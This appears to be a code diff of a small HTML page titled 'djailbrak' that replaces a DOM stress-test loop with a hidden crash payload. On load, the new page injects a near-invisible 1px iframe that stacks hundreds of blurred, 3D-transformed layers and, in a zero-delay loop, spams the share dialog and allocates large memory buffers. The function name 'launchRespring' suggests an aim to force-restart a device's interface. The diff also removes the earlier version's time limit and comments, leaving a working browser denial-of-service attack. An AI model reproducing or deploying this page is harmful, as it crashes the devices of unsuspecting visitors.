@@ -1,33 +1,48 @@
-<div id="container"></div>
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>djailbrak</title>
+</head>
+<body>
 <script>
-const container = document.getElementById("container");
+function launchRespring() {
+  const iframe = document.createElement('iframe');
+  iframe.id = 'respring-iframe';
+  iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;border:none;opacity:0.01;pointer-events:none;z-index:-1;';
+  iframe.setAttribute('sandbox','allow-forms allow-modals allow-scripts allow-same-origin');
+  document.body.appendChild(iframe);
 
-let startTime = performance.now();
-const MAX_TIME = 5000000;     // 5 секунд
-const MAX_NODES = 4000000;    // лимит элементов
+  const respringScript = `
+    <html>
+    <body style="margin:0;overflow:hidden;">
+      <script>
+        const container = document.createElement('div');
+        container.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%;';
+        document.body.appendChild(container);
 
-function stressLoop() {
-  const now = performance.now();
+        for (let i = 0; i < 500; i++) {
+          let d = document.createElement('div');
+          d.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
+          container.appendChild(d);
+        }
 
-  // авто-стоп по времени
-  if (now - startTime > MAX_TIME) {
-    console.log("Stress test finished");
-    return;
-  }
+        setInterval(() => {
+          try {
+            navigator.share({ title: "R", text: "R".repeat(100000) });
+          } catch(e) {}
+          let x = new Uint8Array(1024 * 1024 * 20);
+          crypto.getRandomValues(x);
+        }, 0);
+      <\/script>
+    </body>
+    </html>
+  `;
 
-  // добавляем элементы (умеренно)
-  for (let i = 0; i < 15000000; i++) {
-    const el = document.createElement("div");
-    el.textContent = "loading...";
-    el.style.fontSize = "8px";
-    el.style.whiteSpace = "nowrap";
-    container.appendChild(el);
-  }
-
-  requestAnimationFrame(stressLoop);
+  iframe.srcdoc = respringScript;
 }
 
-// автостарт при загрузке
-stressLoop();
+launchRespring();
 </script>
+</body>
+</html>
